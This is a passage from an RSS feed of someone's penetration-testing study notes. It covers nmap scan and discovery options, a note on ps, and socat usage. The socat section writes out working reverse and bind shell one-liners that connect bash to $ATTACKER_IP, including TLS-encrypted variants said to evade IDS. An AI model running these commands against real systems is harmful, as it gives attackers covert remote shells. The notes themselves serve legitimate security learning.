discovery.&lt;/p&gt;&lt;p&gt;Discovery methods:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;-PA&lt;/code&gt; - Use TCP ACK packets for host discovery; otherwise the same as &lt;code&gt;-PS&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-PE&lt;/code&gt; - Use ICMP Echo for host discovery. (Note that Nmap will still not send the echo request if host existence can be verified using the initial ARP request.)&lt;/li&gt;&lt;li&gt;&lt;code&gt;-PM&lt;/code&gt; - Use ICMP Address Mask for host discovery. (More-or-less the same as &lt;code&gt;-PP&lt;/code&gt;, just a different ICMP request type.)&lt;/li&gt;&lt;li&gt;&lt;code&gt;-PP&lt;/code&gt; - Use ICMP Timestamp for host discovery. (Less likely to be blocked by firewalls than &lt;code&gt;-PE&lt;/code&gt;, but also a more unusual request that may stand out. Like &lt;code&gt;-PE&lt;/code&gt;, Nmap will still not send the timestamp request if host existence can be verified using the initial ARP request.)&lt;/li&gt;&lt;li&gt;&lt;code&gt;-PR&lt;/code&gt; - Use ARP packets only for host discovery.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-PS&lt;/code&gt; - Use TCP SYN packets for host discovery. Uses port 80 by default, or you can specify a port list (e.g., &lt;code&gt;-PS80,8080,8888&lt;/code&gt;) or range (e.g. &lt;code&gt;-PS20-30&lt;/code&gt;). (Note that unprivileged users &lt;em&gt;must&lt;/em&gt; complete a full TCP handshake.)&lt;/li&gt;&lt;li&gt;&lt;code&gt;-PU&lt;/code&gt; - Use UDP packets for host discovery. Unlike other types of host discovery scans, UDP scans only generate a reply (ICMP Port Unreachable) if the target port is &lt;em&gt;closed&lt;/em&gt;.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Most of the time the default discovery options (or -Pn) is fine. The above options are mostly useful for unusual networks or if there's a need to be extra-stealthy.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://nmap.org/book/man-host-discovery.html&quot;&gt;Host Discovery (Official Nmap Project Guide)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;scan-types&quot;&gt;Scan Types&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;-sA&lt;/code&gt; - ACK scan. All ports &lt;em&gt;should&lt;/em&gt; respond with a RST, but firewalls will generally block these requests except for open/forwarded ports. Thus, an ACK scan is useful for probing the configuration of intermediate firewalls (but says nothing about whether services are actually &lt;em&gt;listening&lt;/em&gt; on the identified ports).&lt;/li&gt;&lt;li&gt;&lt;code&gt;-sF&lt;/code&gt; - FIN scan. Use and output is similar to a null scan, but is slightly more likely to be blocked.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-sI&lt;/code&gt; - Idle/Zombie scan. The idea here is to choose a machine with &lt;em&gt;no&lt;/em&gt; traffic on it and then spoof it's IP address. Scans then consist of a SYN/ACK to the zombie to get the current IP ID value for the current port, then a SYN to the target (which should either reply with a RST to the zombie, which doesn't trigger a response and thus doesn't increment the IP ID, or a SYN/ACK to the zombie, which will respond with a RST which &lt;em&gt;will&lt;/em&gt; increment the IP ID), then a second SYN/ACK to the zombie to see if the IP ID has been incremented by 1 (port closed or filtered on the target) or 2 (port open on the target). Note that zombies need to be systems that increment the IP ID sequentially &lt;em&gt;and&lt;/em&gt; globally, and open/closed ports will be from the &lt;em&gt;zombie's&lt;/em&gt; perspective, not the attacker's. These scans are also slooooow (though not as slow as &lt;code&gt;-T0&lt;/code&gt;).&lt;/li&gt;&lt;li&gt;&lt;code&gt;-sL&lt;/code&gt; - Dummy scan. Show the hosts that would be scanned, but don't actually do anything (except perhaps DNS resolution).&lt;/li&gt;&lt;li&gt;&lt;code&gt;-sM&lt;/code&gt; - Maimon scan (named after Uriel Maimon); the FIN and ACK TCP flags are set. Should always receive a RST, but some older BSD systems drop the packet on open ports. Of limited modern utility.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-sn&lt;/code&gt; - Host discovery only (see the previous section for details). Note that the Windows Firewall blocks ICMP by default.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-sN&lt;/code&gt; - Null scan; no TCP flags are set. Used to circumvent &lt;em&gt;stateless&lt;/em&gt; firewalls. Can distinguish between &lt;code&gt;closed&lt;/code&gt; and &lt;code&gt;open|filtered&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-sS&lt;/code&gt; - SYN scan. Most common scan, and nmap's default. Starts a TCP handshake but then sends a RST after receiving the SYN/ACK packet. Requires root, should not be used on OT. Also called a &quot;stealth scan&quot;, but most IDS solutions detect it these days.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-sT&lt;/code&gt;- TCP connect scan. This makes a full TCP handshake when connecting to each port, then sends a RST/ACK after the handshake is finished. Slow but accurate. This is the only scan available for unprivileged users.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-sU&lt;/code&gt; - UDP scan. Sends empty UDP packets (or more realistic packets for known ports) and listens for a response back (&quot;open&quot;) or a ICMP &quot;port unreachable&quot; packet (&quot;closed&quot;). Since UDP doesn't require a response, most ports will get marked &lt;code&gt;open|filtered&lt;/code&gt;. Can be specified with one of the TCP scans to scan TCP and UDP ports simultaneously. &lt;em&gt;Very&lt;/em&gt; slow, so you probably want to use with &lt;code&gt;-sU --top-ports 20&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-sW&lt;/code&gt; - TCP windows scan; the same as an ACK scan except that it examines the TCP window field of returned RST packets and uses it to discern if a port responded &lt;em&gt;differently&lt;/em&gt;. Note that ports may be reported as closed (and open!) erroneously (as not all systems respond in the same way), but unfiltered ports will be identified. Look for patterns of open/closed ports to try to discern how the target system is responding.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-sX&lt;/code&gt; - Xmas scan; the FIN, URG, and PSH TCP flags are set. Use and output is similar to a null scan.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Note that nmap by default uses a TCP window of 1024 bytes and an MSS of 1460. This is actually an unusual combination, and makes most nmap TCP scans stick out in packet captures. The exception to this is a full TCP connect scan, which uses the system TCP stack and thus tends to have more sensible options.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://nmap.org/book/scan-methods-udp-scan.html&quot;&gt;UDP Scan (-sU) (Official Nmap Project Guide)&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://nmap.org/book/scan-methods-window-scan.html&quot;&gt;TCP Window Scan (-sW) (Official Nmap Project Guide)&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://nmap.org/book/idlescan.html&quot;&gt;TCP Idle Scan (-sI) (Official Nmap Project Guide)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;port-states&quot;&gt;Port States&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;Open&lt;/code&gt; - The port is reachable and there is a service listening on it.&lt;/li&gt;&lt;li&gt;&lt;code&gt;Closed&lt;/code&gt; - The port is reachable and there is no service listening on it.&lt;/li&gt;&lt;li&gt;&lt;code&gt;Filtered&lt;/code&gt; - Nmap cannot determine the port state because the port is not accessible (probably because of a firewall).&lt;/li&gt;&lt;li&gt;&lt;code&gt;Unfiltered&lt;/code&gt; - Nmap cannot determine the port state, but the port &lt;em&gt;is&lt;/em&gt; accessible (only encountered in ACK scans).&lt;/li&gt;&lt;li&gt;&lt;code&gt;Open|Filtered&lt;/code&gt; - Nmap can only determine that the port is not closed (only encountered in UDP scans and more exotic scans like Xmas).&lt;/li&gt;&lt;li&gt;&lt;code&gt;Closed|Filtered&lt;/code&gt; - Nmap can only determine that the port is not open (only encountered in IP ID idle scans).&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;output&quot;&gt;Output&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;-oA&lt;/code&gt; - Save the results in &quot;normal&quot;, &quot;grepable&quot;, and XML formats simultaneously. This option will automatically append meaningful extensions (the other options do not do this).&lt;/li&gt;&lt;li&gt;&lt;code&gt;-oG&lt;/code&gt; - Save the results as &quot;grepable&quot; output. This is a compact format meant to automatically provide context when searched with grep.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-oN&lt;/code&gt; - Save results as &quot;normal&quot; output. This is more-or-less what nmap will print to STDOUT.&lt;/li&gt;&lt;li&gt;&lt;code&gt;-oX&lt;/code&gt; - Save the results as XML, designed to be importable by other applications.&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22nmap%22.md</guid>
		</item>
		<item>
			<title>Using "ps"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22ps%22.md</link>
			<description>&lt;p&gt;Instead of &lt;code&gt;u&lt;/code&gt;, &lt;code&gt;j&lt;/code&gt; can be used with &lt;code&gt;ps&lt;/code&gt; to get a slightly different column output format. This is mostly useful for finding out numeric user IDs and &lt;em&gt;parent&lt;/em&gt; process IDs.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/jrpenetrationtester&quot;&gt;TryHackMe: Jr. Penetration Tester&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22ps%22.md</guid>
		</item>
		<item>
			<title>Using "socat"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22socat%22.md</link>
			<description>&lt;p&gt;Socat: An anything-to-anything connector!&lt;/p&gt;&lt;h2 id=&quot;socat-vs-netcat&quot;&gt;&quot;socat&quot; vs. &quot;netcat&quot;&lt;/h2&gt;&lt;p&gt;Equivalent commands between socat and netcat:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Reverse shell (attacker)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;nc&lt;/span&gt; -lnp &lt;span class=&quot;va&quot;&gt;$LISTENER_PORT&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;socat&lt;/span&gt; TCP-LISTEN:&lt;span class=&quot;va&quot;&gt;$LISTENER_PORT&lt;/span&gt; -&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Reverse shell (target)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;nc&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$ATTACKER_IP&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$LISTENER_PORT&lt;/span&gt; -e /bin/bash&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;socat&lt;/span&gt; TCP:&lt;span class=&quot;va&quot;&gt;$ATTACKER_IP&lt;/span&gt;:&lt;span class=&quot;va&quot;&gt;$LISTENER_PORT&lt;/span&gt; EXEC:&lt;span class=&quot;st&quot;&gt;&amp;quot;/bin/bash -li&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-11&quot;&gt;&lt;a href=&quot;#cb1-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Bind shell (attacker)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-12&quot;&gt;&lt;a href=&quot;#cb1-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-13&quot;&gt;&lt;a href=&quot;#cb1-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;nc&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$TARGET_IP&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$LISTENER_PORT&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-14&quot;&gt;&lt;a href=&quot;#cb1-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;socat&lt;/span&gt; TCP:&lt;span class=&quot;va&quot;&gt;$TARGET_IP&lt;/span&gt;:&lt;span class=&quot;va&quot;&gt;$LISTENER_PORT&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-15&quot;&gt;&lt;a href=&quot;#cb1-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-16&quot;&gt;&lt;a href=&quot;#cb1-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Bind shell (target)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-17&quot;&gt;&lt;a href=&quot;#cb1-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-18&quot;&gt;&lt;a href=&quot;#cb1-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;nc&lt;/span&gt; -lnp &lt;span class=&quot;va&quot;&gt;$LISTENER_PORT&lt;/span&gt; -e /bin/bash&lt;/span&gt;
&lt;span id=&quot;cb1-19&quot;&gt;&lt;a href=&quot;#cb1-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;socat&lt;/span&gt; TCP-LISTEN:&lt;span class=&quot;va&quot;&gt;$LISTENER_PORT&lt;/span&gt; EXEC:&lt;span class=&quot;st&quot;&gt;&amp;quot;/bin/bash -li&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Socat gets us an interactive login shell right out the gate, though we're still vulnerable to Ctrl+C. Note that when binding to PowerShell, use &lt;code&gt;powershell.exe,pipes&lt;/code&gt; in order to force PowerShell to use UNIX-style STDIN/STDOUT.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20%22netcat%22.md&quot;&gt;Using &quot;netcat&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;socat-encrypted-shells&quot;&gt;Socat Encrypted Shells&lt;/h3&gt;&lt;p&gt;Socat can also make encrypted connections, which foil after-the-fact network analysis and may circumvent IDS entirely.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Generate a self-signed certificate.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;openssl&lt;/span&gt; req --newkey rsa:2048 -nodes &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-4&quot;&gt;&lt;a href=&quot;#cb2-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;            &lt;span class=&quot;ex&quot;&gt;-keyout&lt;/span&gt; shell.key -x509 -days 362 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-5&quot;&gt;&lt;a href=&quot;#cb2-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;            &lt;span class=&quot;ex&quot;&gt;-out&lt;/span&gt; shell.crt&lt;/span&gt;
&lt;span id=&quot;cb2-6&quot;&gt;&lt;a href=&quot;#cb2-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-7&quot;&gt;&lt;a href=&quot;#cb2-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Create a PEM file combining the certificate and key.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-8&quot;&gt;&lt;a href=&quot;#cb2-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-9&quot;&gt;&lt;a href=&quot;#cb2-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;cat&lt;/span&gt; shell.key shell.crt &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; shell.pem&lt;/span&gt;
&lt;span id=&quot;cb2-10&quot;&gt;&lt;a href=&quot;#cb2-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-11&quot;&gt;&lt;a href=&quot;#cb2-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Start a listener.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-12&quot;&gt;&lt;a href=&quot;#cb2-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-13&quot;&gt;&lt;a href=&quot;#cb2-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;socat&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-14&quot;&gt;&lt;a href=&quot;#cb2-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;OPENSSL-LISTEN&lt;/span&gt;:&lt;span class=&quot;va&quot;&gt;$LISTENER_PORT&lt;/span&gt;,cert=shell.pem,verify=0 -&lt;/span&gt;
&lt;span id=&quot;cb2-15&quot;&gt;&lt;a href=&quot;#cb2-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-16&quot;&gt;&lt;a href=&quot;#cb2-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Start the reverse shell on the target.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-17&quot;&gt;&lt;a href=&quot;#cb2-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-18&quot;&gt;&lt;a href=&quot;#cb2-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;socat&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-19&quot;&gt;&lt;a href=&quot;#cb2-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;OPENSSL&lt;/span&gt;:&lt;span class=&quot;va&quot;&gt;$ATTACKER_IP&lt;/span&gt;:&lt;span class=&quot;va&quot;&gt;$LISTENER_PORT&lt;/span&gt;,verify=0 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-20&quot;&gt;&lt;a href=&quot;#cb2-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;EXEC&lt;/span&gt;:&lt;span class=&quot;st&quot;&gt;&amp;quot;/bin/bash -li&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;verify=0&lt;/code&gt; directive turns off certificate validation, so this isn't a &quot;secure&quot; connection in the sense that it's been &lt;em&gt;authenticated&lt;/em&gt;, but it is secure in the sense that it's &lt;em&gt;encrypted&lt;/em&gt;.&lt;/p&gt;&lt;h2 id=&quot;shell-stabilization&quot;&gt;Shell &quot;Stabilization&quot;&lt;/h2&gt;&lt;p&gt;Shell &quot;stabilization&quot; refers to the process of making a remote shell behave like a normal local shell - so, allowing interactive programs to work properly, ensuring that input is not echoed inappropriately, etc.&lt;/p&gt;&lt;p&gt;We can use socat to create an auto-stabilized reverse shell on UNIX-like systems.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Attacker: Connect $LISTENER_PORT to the current TTY,&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# send raw keycodes, and turn off terminal echo.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Basically the `stty raw -echo`.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-4&quot;&gt;&lt;a href=&quot;#cb3-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-5&quot;&gt;&lt;a href=&quot;#cb3-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;socat&lt;/span&gt; TCP-LISTEN:&lt;span class=&quot;va&quot;&gt;$LISTENER_PORT&lt;/span&gt; FILE:&lt;span class=&quot;kw&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;ex&quot;&gt;tty&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;`&lt;/span&gt;,raw,echo=0&lt;/span&gt;
&lt;span id=&quot;cb3-6&quot;&gt;&lt;a href=&quot;#cb3-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-7&quot;&gt;&lt;a href=&quot;#cb3-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Target: Connect the listener on the attacker to an&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-8&quot;&gt;&lt;a href=&quot;#cb3-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# interactive login bash shell.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-9&quot;&gt;&lt;a href=&quot;#cb3-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-10&quot;&gt;&lt;a href=&quot;#cb3-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#     pty    - allocate a PTTY&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-11&quot;&gt;&lt;a href=&quot;#cb3-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#     stderr - redirect STDERR to the attacker&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-12&quot;&gt;&lt;a href=&quot;#cb3-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#     sigint - pass signals (Ctrl+C) through&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-13&quot;&gt;&lt;a href=&quot;#cb3-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#     setsid - use a new session&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-14&quot;&gt;&lt;a href=&quot;#cb3-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#     sane   - use a variety of tweaks to &amp;quot;normalize&amp;quot; the&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-15&quot;&gt;&lt;a href=&quot;#cb3-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#              terminal&amp;#39;s environment&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-16&quot;&gt;&lt;a href=&quot;#cb3-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-17&quot;&gt;&lt;a href=&quot;#cb3-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;socat&lt;/span&gt; TCP:&lt;span class=&quot;va&quot;&gt;$ATTACKER_IP&lt;/span&gt;:&lt;span class=&quot;va&quot;&gt;$LISTENER_PORT&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-18&quot;&gt;&lt;a href=&quot;#cb3-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;      &lt;span class=&quot;ex&quot;&gt;EXEC&lt;/span&gt;:&lt;span class=&quot;st&quot;&gt;&amp;quot;/bin/bash -li&amp;quot;&lt;/span&gt;,pty,stderr,sigint,setsid,sane&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Same thing, but over an encrypted connection:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Attacker: Connect $LISTENER_PORT to the current TTY,&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-2&quot;&gt;&lt;a href=&quot;#cb4-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# send raw keycodes, and turn off terminal echo. Basically&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-3&quot;&gt;&lt;a href=&quot;#cb4-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# the `stty raw -echo`.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-4&quot;&gt;&lt;a href=&quot;#cb4-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
